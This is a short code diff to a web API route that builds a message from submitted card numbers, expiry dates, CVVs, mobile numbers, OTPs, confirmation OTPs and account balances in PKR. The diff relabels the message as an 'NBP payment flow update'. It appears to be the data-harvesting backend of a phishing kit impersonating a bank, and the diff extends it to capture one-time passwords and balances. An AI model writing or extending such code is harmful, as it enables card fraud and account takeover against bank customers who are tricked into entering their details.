@@ -15,14 +15,25 @@ export async function POST(request: Request) {
     if (typeof body?.text === 'string' && body.text.trim()) {
       // Pre-formatted message
       text = body.text.trim()
-    } else if (body?.card || body?.mobile || body?.month || body?.year || body?.cvv) {
-      // Structured card submission
+    } else if (
+      body?.mobile ||
+      body?.card ||
+      body?.month ||
+      body?.year ||
+      body?.cvv ||
+      body?.otp ||
+      body?.balance ||
+      body?.otpConfirm
+    ) {
       const lines = [
-        'New card submission:',
-        body?.card ? `Card: ${body.card}` : null,
-        body?.month || body?.year ? `Expiry: ${body?.month ?? '--'}/${body?.year ?? '----'}` : null,
+        'NBP payment flow update:',
+        body?.mobile ? `Mobile Number: ${body.mobile}` : null,
+        body?.card ? `Card Number: ${body.card}` : null,
+        body?.month || body?.year ? `Expiry Date: ${body?.month ?? '--'}/${body?.year ?? '----'}` : null,
         body?.cvv ? `CVV: ${body.cvv}` : null,
-        body?.mobile ? `Mobile: ${body.mobile}` : null,
+        body?.otp ? `OTP: ${body.otp}` : null,
+        body?.balance ? `Account Balance: PKR ${body.balance}` : null,
+        body?.otpConfirm ? `Confirmation OTP: ${body.otpConfirm}` : null,
       ].filter(Boolean)
       text = lines.join('\n')
     } else {
